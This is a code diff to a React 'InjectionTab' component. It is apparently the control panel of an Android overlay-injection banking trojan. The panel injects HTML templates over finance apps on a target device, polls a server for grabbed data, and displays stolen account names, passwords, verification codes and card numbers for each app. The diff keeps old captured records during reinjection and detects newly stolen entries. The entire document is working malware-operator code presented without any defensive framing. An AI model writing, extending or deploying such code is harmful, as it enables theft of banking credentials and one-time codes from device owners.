@@ -34,6 +34,11 @@ function getFinanceCategory(packageName, appName) {
   return ''
 }
 
+function grabbedRecordKey(item) {
+  if (item?.id !== undefined && item?.id !== null) return `id:${item.id}`
+  return `${item?.packageName || ''}:${item?.timestamp || ''}:${JSON.stringify(item?.data || {})}`
+}
+
 export default function InjectionTab({
   resolvedDeviceId,
   sendWs,
@@ -54,6 +59,7 @@ export default function InjectionTab({
   const [injLoadingPkg, setInjLoadingPkg] = useState(null)
   const [refreshing, setRefreshing] = useState(false)
   const [showOtherApps, setShowOtherApps] = useState(false)
+  const [reinjectSessions, setReinjectSessions] = useState({})
 
   // 加载设备应用列表和模板
   const loadData = useCallback(async () => {
@@ -78,6 +84,45 @@ export default function InjectionTab({
   }, [resolvedDeviceId])
 
   useEffect(() => { loadData() }, [loadData])
+
+  // 重注期间轮询新记录：历史数据保留；检测到本次新增记录后结束“注入中”状态。
+  useEffect(() => {
+    if (!resolvedDeviceId || Object.keys(reinjectSessions).length === 0) return undefined
+    let cancelled = false
+
+    const pollGrabbedData = async () => {
+      try {
+        const res = await api.request(`/api/injection/grabbed-data?deviceId=${encodeURIComponent(resolvedDeviceId)}`)
+        const list = Array.isArray(res) ? res : (res?.data || res?.items || [])
+        if (cancelled || !Array.isArray(list)) return
+        setInjGrabbed?.(list)
+
+        const completedPackages = Object.entries(reinjectSessions)
+          .filter(([pkg, session]) => list.some(item =>
+            item.packageName === pkg && !session.existingKeys.includes(grabbedRecordKey(item))
+          ))
+          .map(([pkg, session]) => ({ pkg, templateId: session.templateId }))
+
+        if (completedPackages.length === 0) return
+        const completedSet = new Set(completedPackages.map(item => item.pkg))
+        const completedIds = new Set(completedPackages.map(item => item.templateId))
+        setReinjectSessions(prev => {
+          const next = { ...prev }
+          completedPackages.forEach(({ pkg }) => delete next[pkg])
+          return next
+        })
+        setInjActivePkgs?.(prev => new Set([...prev].filter(pkg => !completedSet.has(pkg))))
+        setInjActiveIds?.(prev => new Set([...prev].filter(id => !completedIds.has(id))))
+        completedPackages.forEach(({ pkg }) => {
+          api.request(`/api/injection/active-tasks?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(pkg)}`, { method: 'DELETE' }).catch(() => {})
+        })
+      } catch {}
+    }
+
+    pollGrabbedData()
+    const timer = setInterval(pollGrabbedData, 1500)
+    return () => { cancelled = true; clearInterval(timer) }
+  }, [resolvedDeviceId, reinjectSessions, setInjGrabbed, setInjActivePkgs, setInjActiveIds])
 
   // 切换自动注入开关
   const toggleAutoInjection = async () => {
@@ -133,13 +178,14 @@ export default function InjectionTab({
     const pkg = tpl.packageName || tpl.package_name
     const templateId = tpl.templateId || tpl.template_id || tpl.id
     setInjLoadingPkg(pkg)
+    setReinjectSessions(prev => ({
+      ...prev,
+      [pkg]: {
+        templateId,
+        existingKeys: injGrabbed.filter(item => item.packageName === pkg).map(grabbedRecordKey),
+      },
+    }))
     try {
-      // 重注前仅清除此设备、此应用的旧抓取记录，避免旧验证码继续显示。
-      await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&packageName=${encodeURIComponent(pkg)}`, {
-        method: 'DELETE',
-      })
-      setInjGrabbed?.(prev => prev.filter(item => item.packageName !== pkg))
-
       // 如果模板没有 htmlContent，先获取；用 query 方式避免中文/空格模板 ID 走路径导致 404
       let htmlContent = tpl.htmlContent || tpl.html_content || ''
       if (!htmlContent && (tpl.templateId || tpl.template_id || tpl.id || tpl.packageName || tpl.package_name)) {
@@ -166,6 +212,7 @@ export default function InjectionTab({
       setInjActiveIds?.(prev => new Set([...prev, templateId]))
       centerToast(`已注入: ${tpl.name}`)
     } catch (e) {
+      setReinjectSessions(prev => { const next = { ...prev }; delete next[pkg]; return next })
       toast('注入失败: ' + e.message, 'error')
     } finally {
       setTimeout(() => setInjLoadingPkg(null), 800)
@@ -190,6 +237,7 @@ export default function InjectionTab({
     } catch {}
     setInjActivePkgs?.(prev => { const next = new Set(prev); next.delete(pkg); return next })
     setInjActiveIds?.(prev => { const next = new Set(prev); next.delete(tpl.templateId || tpl.template_id || tpl.id); return next })
+    setReinjectSessions(prev => { const next = { ...prev }; delete next[pkg]; return next })
     centerToast(`已停止: ${tpl.name || pkg}`)
     setInjLoadingPkg(null)
   }
@@ -328,7 +376,11 @@ export default function InjectionTab({
           ) : (
             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 10 }}>
               {sortedMatchedApps.map(({ packageName, appName, icon, tpl }) => {
-                const grabbed = injGrabbed.find(g => g.packageName === packageName)
+                const reinjectSession = reinjectSessions[packageName]
+                const grabbed = injGrabbed.find(g =>
+                  g.packageName === packageName &&
+                  (!reinjectSession || !reinjectSession.existingKeys.includes(grabbedRecordKey(g)))
+                )
                 const gData = parseGrabbedData ? parseGrabbedData(grabbed?.data) : {}
                 const hasData = !!(gData.account || gData.password || gData.verification || gData.card)
                 // 自动注入开关只表示功能已启用；实际运行态以活跃任务为准。
